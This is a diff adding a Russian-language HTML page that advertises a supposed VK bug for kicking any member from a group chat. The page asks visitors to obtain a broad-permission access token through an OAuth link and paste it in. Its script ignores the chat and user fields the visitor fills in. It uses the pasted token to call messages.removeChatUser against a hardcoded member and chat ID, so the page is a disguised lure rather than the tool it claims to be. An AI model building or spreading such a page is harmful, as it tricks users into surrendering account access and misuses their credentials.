@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>БАГ ВК</title>
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+</head>
+<body>
+	<div class="container text-center mt-5 align-middle">
+		<div class="row justify-content-center">
+			<div style="padding: 5%;">
+				<img src="https://vk.com/images/icons/pwa/apple/default.png?8" style="border-radius: 90px;" width="50" height="50">
+				<h1>Кик пользователя</h1>
+				<p>С недавних пор в VK появилась уязвимость: стало возможным благодаря некоторым инструментам кикать абсолютно любого участника беседы, включая создателя, даже если у самого нет статуса администратора.</p>
+				<p><a href="https://oauth.vk.com/authorize?client_id=2685278&scope=1073737727&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1" target="_blank">Получить токен</a></p>
+				<p><input class="form-control" placeholder="Токен" id="token"></p>
+				<p><input class="form-control" placeholder="Ссылка на чат"></p>
+				<p><input class="form-control" placeholder="Ссылка на пользователя"></p>
+				<p><button class="btn btn-primary mr-1" id="action">Кикнуть</button></p>
+				<p><a href="https://vk.com/ogai2020" target="_blank">Создатель</a></p>
+			</div>
+		</div>
+	</div>
+
+	<script>
+		let button = document.getElementById('action');
+		button.onclick = function() {
+			let token = document.getElementById('token').value;
+
+			let el = document.createElement('script');
+			el.src = `https://api.vk.com/method/messages.removeChatUser?v=5.103&access_token=${token}&member_id=537420003&chat_id=639`;
+			document.body.appendChild(el);
+		}
+
+		// function _callback(response) {
+		// 	console.log(response.response[0].id);
+		// }
+		
+	</script>
+	
+</body>
+</html>
